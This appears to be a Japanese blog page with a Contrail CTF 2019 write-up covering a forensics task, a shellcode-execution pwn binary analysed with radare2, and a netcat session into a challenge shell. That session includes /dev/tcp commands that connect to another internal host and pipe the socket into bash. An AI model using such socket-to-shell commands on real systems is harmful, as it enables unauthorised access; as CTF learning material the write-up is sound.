<!DOCTYPE html>
<html lang="ja">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Note</title>
    <meta name="description" content="Take it easy. But not lazy.">
    
    
    <link rel="preload" href="/assets/css/0.styles.6f1cf167.css" as="style"><link rel="preload" href="/assets/js/app.e001477b.js" as="script"><link rel="preload" href="/assets/js/5.4b6140b2.js" as="script"><link rel="preload" href="/assets/js/2.c2c74dfd.js" as="script"><link rel="preload" href="/assets/js/37.17578f1b.js" as="script"><link rel="prefetch" href="/assets/js/10.8a902e14.js"><link rel="prefetch" href="/assets/js/11.3906fff2.js"><link rel="prefetch" href="/assets/js/12.43abeb44.js"><link rel="prefetch" href="/assets/js/13.9c330cb9.js"><link rel="prefetch" href="/assets/js/14.26a5e8cc.js"><link rel="prefetch" href="/assets/js/15.5ee65e59.js"><link rel="prefetch" href="/assets/js/16.36e05484.js"><link rel="prefetch" href="/assets/js/17.b7b0fb4f.js"><link rel="prefetch" href="/assets/js/18.983b9e61.js"><link rel="prefetch" href="/assets/js/19.0e603f0e.js"><link rel="prefetch" href="/assets/js/20.ca3d1bc2.js"><link rel="prefetch" href="/assets/js/21.9e399b71.js"><link rel="prefetch" href="/assets/js/22.fae84cfe.js"><link rel="prefetch" href="/assets/js/23.e61212f5.js"><link rel="prefetch" href="/assets/js/24.395bc587.js"><link rel="prefetch" href="/assets/js/25.55404afc.js"><link rel="prefetch" href="/assets/js/26.545d2225.js"><link rel="prefetch" href="/assets/js/27.4da01ee5.js"><link rel="prefetch" href="/assets/js/28.81c383cf.js"><link rel="prefetch" href="/assets/js/29.87dd078e.js"><link rel="prefetch" href="/assets/js/3.faf42d1d.js"><link rel="prefetch" href="/assets/js/30.dabdae9a.js"><link rel="prefetch" href="/assets/js/31.39d83b4d.js"><link rel="prefetch" href="/assets/js/32.69d0f1b1.js"><link rel="prefetch" href="/assets/js/33.040b3cb1.js"><link rel="prefetch" href="/assets/js/34.5cb6cbd0.js"><link rel="prefetch" href="/assets/js/35.63bddfca.js"><link rel="prefetch" href="/assets/js/36.e808f3bf.js"><link rel="prefetch" href="/assets/js/38.21e86492.js"><link rel="prefetch" href="/assets/js/39.741d1a28.js"><link rel="prefetch" href="/assets/js/4.7a95267e.js"><link rel="prefetch" href="/assets/js/40.12faed48.js"><link rel="prefetch" href="/assets/js/41.814634ae.js"><link rel="prefetch" href="/assets/js/42.f1824241.js"><link rel="prefetch" href="/assets/js/43.f23cd56c.js"><link rel="prefetch" href="/assets/js/44.bf8d1fb8.js"><link rel="prefetch" href="/assets/js/45.b700cdb0.js"><link rel="prefetch" href="/assets/js/46.f637652a.js"><link rel="prefetch" href="/assets/js/47.20e6cdf9.js"><link rel="prefetch" href="/assets/js/48.64b669d7.js"><link rel="prefetch" href="/assets/js/49.9454acc2.js"><link rel="prefetch" href="/assets/js/50.a549b557.js"><link rel="prefetch" href="/assets/js/51.7eb3fd15.js"><link rel="prefetch" href="/assets/js/52.27d66f05.js"><link rel="prefetch" href="/assets/js/53.5c3a647b.js"><link rel="prefetch" href="/assets/js/54.aa7cad69.js"><link rel="prefetch" href="/assets/js/55.df8d8559.js"><link rel="prefetch" href="/assets/js/56.f8b22253.js"><link rel="prefetch" href="/assets/js/57.4c948c84.js"><link rel="prefetch" href="/assets/js/58.acdab36e.js"><link rel="prefetch" href="/assets/js/59.97fcb25e.js"><link rel="prefetch" href="/assets/js/6.210a5a5f.js"><link rel="prefetch" href="/assets/js/60.b149920d.js"><link rel="prefetch" href="/assets/js/61.7e23672b.js"><link rel="prefetch" href="/assets/js/62.aa656c25.js"><link rel="prefetch" href="/assets/js/63.453a78d7.js"><link rel="prefetch" href="/assets/js/64.78a46310.js"><link rel="prefetch" href="/assets/js/65.2ba3671c.js"><link rel="prefetch" href="/assets/js/66.755db00e.js"><link rel="prefetch" href="/assets/js/67.93401111.js"><link rel="prefetch" href="/assets/js/68.e06952eb.js"><link rel="prefetch" href="/assets/js/69.f7c9b007.js"><link rel="prefetch" href="/assets/js/7.4a861073.js"><link rel="prefetch" href="/assets/js/70.c485fa00.js"><link rel="prefetch" href="/assets/js/71.f1432582.js"><link rel="prefetch" href="/assets/js/72.96cfdcef.js"><link rel="prefetch" href="/assets/js/73.1e71d3c6.js"><link rel="prefetch" href="/assets/js/74.46af0c28.js"><link rel="prefetch" href="/assets/js/75.f1c8d0c4.js"><link rel="prefetch" href="/assets/js/76.450042a3.js"><link rel="prefetch" href="/assets/js/77.fa018d30.js"><link rel="prefetch" href="/assets/js/78.4906fbcb.js"><link rel="prefetch" href="/assets/js/79.93918013.js"><link rel="prefetch" href="/assets/js/8.3c008a46.js"><link rel="prefetch" href="/assets/js/80.91739055.js"><link rel="prefetch" href="/assets/js/81.39911c84.js"><link rel="prefetch" href="/assets/js/82.4cfe7e3a.js"><link rel="prefetch" href="/assets/js/83.ae926e7e.js"><link rel="prefetch" href="/assets/js/84.943db9ef.js"><link rel="prefetch" href="/assets/js/85.99d58996.js"><link rel="prefetch" href="/assets/js/9.aa64878f.js">
    <link rel="stylesheet" href="/assets/css/0.styles.6f1cf167.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Note</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/list.html" class="nav-link">Articles</a></div><div class="nav-item"><a href="/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/list.html" class="nav-link">Articles</a></div><div class="nav-item"><a href="/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span></span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/article/20200104.html#forensics" class="sidebar-link">forensics</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/article/20200104.html#persistence" class="sidebar-link">Persistence</a></li><li class="sidebar-sub-header"><a href="/article/20200104.html#alice-s-password" class="sidebar-link">alice's password</a></li></ul></li><li><a href="/article/20200104.html#pwn" class="sidebar-link">Pwn</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/article/20200104.html#easyshellcode" class="sidebar-link">EasyShellCode</a></li></ul></li><li><a href="/article/20200104.html#misc" class="sidebar-link">Misc</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/article/20200104.html#let-s-connct" class="sidebar-link">Let's connct</a></li></ul></li><li><a href="/article/20200104.html#ref" class="sidebar-link">ref</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><p>--
date: 2020-01-04
description: 'Contrail CTF 参加記録'
category:</p> <ul><li>雑記</li></ul> <hr> <h1 id="contrail-ctf-参加記録と解き直し"><a href="#contrail-ctf-参加記録と解き直し" class="header-anchor">#</a> Contrail CTF 参加記録と解き直し</h1> <p>SCBで出て, Score302, 25位でした。
そのうち, 私は以下の問題を解きました。</p> <ul><li>debug_port: network</li> <li>Persistence: forensics</li></ul> <p>では, 解き直しをやっていき</p> <h2 id="forensics"><a href="#forensics" class="header-anchor">#</a> forensics</h2> <h3 id="persistence"><a href="#persistence" class="header-anchor">#</a> Persistence</h3> <p><code>.arn</code>ファイルが与えられます。<br>
これはAutorunsの拡張子なので, 開いて中身を確認します。</p> <p>Task Schedulerに<code>\Evil</code>というプロセスが残っているので中身を確認するとflagがあります。</p> <h3 id="alice-s-password"><a href="#alice-s-password" class="header-anchor">#</a> alice's password</h3> <p>正しくunzipできないzipファイルとdataが与えられます。</p> <h2 id="pwn"><a href="#pwn" class="header-anchor">#</a> Pwn</h2> <h3 id="easyshellcode"><a href="#easyshellcode" class="header-anchor">#</a> EasyShellCode</h3> <p>20Byte(0x14)までしかread()してくれない。
そのあとはシェルコードを実行してくれる。</p> <p>radare2で逆アセンブルする。</p> <div class="language- extra-class"><pre class="language-text"><code># r2 problem 
[0x00000710]&gt; aaaa
[Cannot analyze at 0x00000700g with sym. and entry0 (aa)
[x] Analyze all flags starting with sym. and entry0 (aa)
[Cannot analyze at 0x00000700ac)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x00000710]&gt; s main
[0x0000081a]&gt; pdd
/* r2dec pseudo code output */
/* problem @ 0x81a */
#include &lt;stdint.h&gt;
 
int32_t main (void) {
    rax = *(fs:0x28);
    *((rbp - 8)) = rax;
    eax = 0;
    r9d = 0;
    r8d = 0;
    rax = mmap (0, 0x64, 7, 0x22, r8d, r9d);
    *((rbp - 0x10)) = rax;
    eax = 0;
    printf (&quot;Input your shellcode: &quot;);
    rax = stdout;
    fflush (*(obj.stdout));
    rax = *((rbp - 0x10));
    read (0, rax, 0x14);
    rax = *((rbp - 0x10));
    edx = 7;
    esi = 0x64;
    rdi = rax;
    mprotect ();
    rax = rbp - 0x10;
    rdx = 0;
    rdi = 0;
    rsi = 0;
    rbx = 0;
    rcx = 0;
    r8 = 0;
    r9 = 0;
    r10 = 0;
    r11 = 0;
    r12 = 0;
    r13 = 0;
    r14 = 0;
    r15 = 0;
    rbp = 0;
    return uint64_t (*rax)() ();
}
</code></pre></div><p>最後の行で<code>uint64_t (*rax)() ();</code>を実行しているので, <code>read (0, rax, 0x14);</code>でシェルコードを読み込めれば問題なく実行できそう。</p> <p>これは, 引数が空で返り値がuint64_tな関数へのポインタであり, raxから始まるアドレスに格納されているアドレスを間接参照で読み出します。</p> <ul><li><a href="https://www.sigbus.info/compilerbook#type" target="_blank" rel="noopener noreferrer">詳しくはこちらを見ると良い<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul> <h2 id="misc"><a href="#misc" class="header-anchor">#</a> Misc</h2> <h3 id="let-s-connct"><a href="#let-s-connct" class="header-anchor">#</a> Let's connct</h3> <div class="language- extra-class"><pre class="language-text"><code>$ nc 114.177.250.4 2999
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ help
help
GNU bash, version 4.4.20(1)-release (x86_64-pc-linux-gnu)
These shell commands are defined internally.  Type `help' to see this list.
Type `help name' to find out more about the function `name'.
Use `info bash' to find out more about the shell in general.
Use `man -k' or `info' to find out more about commands not in this list.

A star (*) next to a name means that the command is disabled.

 job_spec [&amp;]                            history [-c] [-d offset] [n] or hist&gt;
 (( expression ))                        if COMMANDS; then COMMANDS; [ elif C&gt;
 . filename [arguments]                  jobs [-lnprs] [jobspec ...] or jobs &gt;
 :                                       kill [-s sigspec | -n signum | -sigs&gt;
 [ arg... ]                              let arg [arg ...]
 [[ expression ]]                        local [option] name[=value] ...
 alias [-p] [name[=value] ... ]          logout [n]
 bg [job_spec ...]                       mapfile [-d delim] [-n count] [-O or&gt;
 bind [-lpsvPSVX] [-m keymap] [-f file&gt;  popd [-n] [+N | -N]
 break [n]                               printf [-v var] format [arguments]
 builtin [shell-builtin [arg ...]]       pushd [-n] [+N | -N | dir]
 caller [expr]                           pwd [-LP]
 case WORD in [PATTERN [| PATTERN]...)&gt;  read [-ers] [-a array] [-d delim] [-&gt;
 cd [-L|[-P [-e]] [-@]] [dir]            readarray [-n count] [-O origin] [-s&gt;
 command [-pVv] command [arg ...]        readonly [-aAf] [name[=value] ...] o&gt;
 compgen [-abcdefgjksuv] [-o option] [&gt;  return [n]
 complete [-abcdefgjksuv] [-pr] [-DE] &gt;  select NAME [in WORDS ... ;] do COMM&gt;
 compopt [-o|+o option] [-DE] [name ..&gt;  set [-abefhkmnptuvxBCHP] [-o option-&gt;
 continue [n]                            shift [n]
 coproc [NAME] command [redirections]    shopt [-pqsu] [-o] [optname ...]
 declare [-aAfFgilnrtux] [-p] [name[=v&gt;  source filename [arguments]
 dirs [-clpv] [+N] [-N]                  suspend [-f]
 disown [-h] [-ar] [jobspec ... | pid &gt;  test [expr]
 echo [-neE] [arg ...]                   time [-p] pipeline
 enable [-a] [-dnps] [-f filename] [na&gt;  times
 eval [arg ...]                          trap [-lp] [[arg] signal_spec ...]
 exec [-cl] [-a name] [command [argume&gt;  true
 exit [n]                                type [-afptP] name [name ...]
 export [-fn] [name[=value] ...] or ex&gt;  typeset [-aAfFgilnrtux] [-p] name[=v&gt;
 false                                   ulimit [-SHabcdefiklmnpqrstuvxPT] [l&gt;
 fc [-e ename] [-lnr] [first] [last] o&gt;  umask [-p] [-S] [mode]
 fg [job_spec]                           unalias [-a] name [name ...]
 for NAME [in WORDS ... ] ; do COMMAND&gt;  unset [-f] [-v] [-n] [name ...]
 for (( exp1; exp2; exp3 )); do COMMAN&gt;  until COMMANDS; do COMMANDS; done
 function name { COMMANDS ; } or name &gt;  variables - Names and meanings of so&gt;
 getopts optstring name [arg]            wait [-n] [id ...]
 hash [-lr] [-p pathname] [-dt] [name &gt;  while COMMANDS; do COMMANDS; done
 help [-dms] [pattern ...]               { COMMANDS ; }
bash-4.4history
history
    1  help
    2  history
bash-4.4$ history
history
    1  help
    2  history
    3  history
bash-4.4$ exec &lt;&gt; /dev/tcp/172.17.0.10/3000
exec &lt;&gt; /dev/tcp/172.17.0.10/3000
bash: connect: Connection refused
bash: /dev/tcp/172.17.0.10/3000: Connection refused
bash-4.4$ ls
ls
bash
bin
dev
flag
lib
lib32
lib64
bash-4.4$ echo &quot;$(&lt;flag)&quot;
 echo &quot;$(&lt;flag)&quot;
Flag has moved to 3000 port on 172.17.0.5 .
bash-4.4$ exec 3&lt;&gt; /dev/tcp/172.17.0.5/3000; ./bash &lt;&amp;3
</code></pre></div><h2 id="ref"><a href="#ref" class="header-anchor">#</a> ref</h2> <ul><li><a href="https://www.aquablog.site/entry/2020/01/04/000000" target="_blank" rel="noopener noreferrer">Contrail CTF writeup by aqua<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li><a href="http://szarny.hatenablog.com/entry/2020/01/04/ContrailCTF_2019%E3%81%AEwriteup" target="_blank" rel="noopener noreferrer">ContrailCTF_2019のwriteup by Tsubasa<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li><a href="https://www.ryotosaito.com/blog/?p=400" target="_blank" rel="noopener noreferrer">Contrail CTF WriteUp by ryoto<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li><a href="https://ptr-yudai.hatenablog.com/entry/2020/01/04/000225" target="_blank" rel="noopener noreferrer">Contrail CTF 2019のWriteup by ptr-yudai<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated: </span> <span class="time">2020-1-7 09:06:34</span></div></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.e001477b.js" defer></script><script src="/assets/js/5.4b6140b2.js" defer></script><script src="/assets/js/2.c2c74dfd.js" defer></script><script src="/assets/js/37.17578f1b.js" defer></script>
  </body>
</html>
